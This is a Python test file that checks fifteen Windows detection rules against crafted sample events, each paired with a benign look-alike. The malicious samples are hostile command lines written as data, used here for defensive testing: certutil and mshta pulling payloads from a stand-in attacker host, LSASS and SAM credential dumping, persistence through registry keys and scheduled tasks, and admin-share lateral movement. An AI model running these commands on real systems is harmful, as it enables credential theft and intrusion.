"""Day 10 verification (Pair 1): "test each rule against crafted sample
events" -- the full fire/no-fire matrix for all rules in
detection/rules/, end to end through rule_loader.load_rules() +
engine.evaluate_event(). Filename matches the roadmap's Day 10 Files
column exactly. Extended Day 12 with 5 more cases (lateral movement /
credential access rules, 10 -> 15 total).
"""

from datetime import datetime, timezone

import pytest

from app.detection import rule_loader
from app.detection.engine import evaluate_event
from app.schemas.event import NormalizedEvent

# (rule_title, event_id, matching event_data, benign look-alike event_data)
RULE_CASES = [
    (
        "Suspicious Encoded PowerShell Command",
        1,
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -Command Get-Process"},
    ),
    (
        "Certutil Download via urlcache/split Flags",
        1,
        {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://evil.example/a.exe out.exe"},
        {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -verify cert.pem"},
    ),
    (
        "PowerShell Execution Policy Bypass",
        1,
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File payload.ps1"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -Command Get-Process"},
    ),
    (
        "Suspicious Network Connection from LOLBin",
        3,
        {"Image": "C:\\Windows\\System32\\powershell.exe", "DestinationIp": "203.0.113.10", "DestinationPort": "443"},
        {"Image": "C:\\Windows\\System32\\svchost.exe", "DestinationIp": "239.255.255.250", "DestinationPort": "1900"},
    ),
    (
        "Suspicious Executable Written to Public or Temp Directory",
        11,
        {"TargetFilename": "C:\\Users\\Public\\update.exe"},
        {"TargetFilename": "C:\\Users\\alice\\Documents\\report.docx"},
    ),
    (
        "Registry Run Key Persistence",
        13,
        {"TargetObject": "HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", "Details": "C:\\Users\\Public\\update.exe"},
        {"TargetObject": "HKU\\S-1-5-21\\Software\\SomeVendor\\App\\Settings", "Details": "1"},
    ),
    (
        "Registry IFEO Debugger Hijack",
        13,
        {"TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger", "Details": "C:\\Windows\\System32\\cmd.exe"},
        {"TargetObject": "HKU\\S-1-5-21\\Software\\SomeVendor\\App\\Settings", "Details": "1"},
    ),
    (
        "Scheduled Task Creation via schtasks.exe",
        1,
        {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks.exe /create /tn Updater /tr payload.exe /sc onlogon"},
        {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks.exe /query /tn Updater"},
    ),
    (
        "Suspicious Scheduled Task via PowerShell Cmdlet",
        1,
        {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe Register-ScheduledTask -TaskName Updater -Action $action"},
        {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe Get-ScheduledTask"},
    ),
    (
        "Suspicious Mshta Execution",
        1,
        {"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe http://evil.example/payload.hta"},
        {"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe"},
    ),
    (
        "LSASS Memory Dump",
        1,
        {"Image": "C:\\Tools\\procdump.exe", "CommandLine": "procdump.exe -ma lsass.exe lsass.dmp"},
        {"Image": "C:\\Tools\\procdump.exe", "CommandLine": "procdump.exe -ma notepad.exe notepad.dmp"},
    ),
    (
        "SAM/SYSTEM/SECURITY Registry Hive Dump",
        1,
        {"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg.exe save hklm\\sam C:\\temp\\sam.hive"},
        {"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg.exe query hklm\\software\\microsoft"},
    ),
    (
        "RDP Lateral Movement",
        3,
        {"Image": "C:\\Windows\\System32\\mstsc.exe", "DestinationIp": "10.0.0.5", "DestinationPort": "3389"},
        {"Image": "C:\\Windows\\System32\\svchost.exe", "DestinationIp": "10.0.0.5", "DestinationPort": "443"},
    ),
    (
        "Lateral Movement via Windows Admin Share",
        1,
        {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net.exe use \\\\10.0.0.5\\admin$ /user:admin"},
        {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net.exe use \\\\10.0.0.5\\shared /user:admin"},
    ),
    (
        "WinRM Lateral Movement",
        3,
        {"Image": "C:\\Windows\\System32\\powershell.exe", "DestinationIp": "10.0.0.5", "DestinationPort": "5985"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "DestinationIp": "10.0.0.5", "DestinationPort": "80"},
    ),
]


def _event(event_id, event_data):
    return NormalizedEvent(
        host="WORKSTATION01",
        timestamp=datetime(2026, 8, 19, tzinfo=timezone.utc),
        event_id=event_id,
        raw={},
        event_data=event_data,
    )


def test_exactly_fifteen_rules_are_covered_by_this_matrix():
    assert len(RULE_CASES) == 15
    rules = rule_loader.load_rules()
    assert {title for title, *_ in RULE_CASES} == {r.title for r in rules}


@pytest.mark.parametrize("title,event_id,matching_data,benign_data", RULE_CASES, ids=[c[0] for c in RULE_CASES])
def test_rule_fires_on_matching_event(title, event_id, matching_data, benign_data):
    rules = rule_loader.load_rules()
    event = _event(event_id, matching_data)

    matches = evaluate_event(event, rules)

    assert any(m.title == title for m in matches), f"expected {title!r} to fire, matched: {[m.title for m in matches]}"


@pytest.mark.parametrize("title,event_id,matching_data,benign_data", RULE_CASES, ids=[c[0] for c in RULE_CASES])
def test_rule_does_not_fire_on_benign_look_alike(title, event_id, matching_data, benign_data):
    rules = rule_loader.load_rules()
    event = _event(event_id, benign_data)

    matches = evaluate_event(event, rules)

    assert not any(m.title == title for m in matches), f"expected {title!r} NOT to fire on benign data"
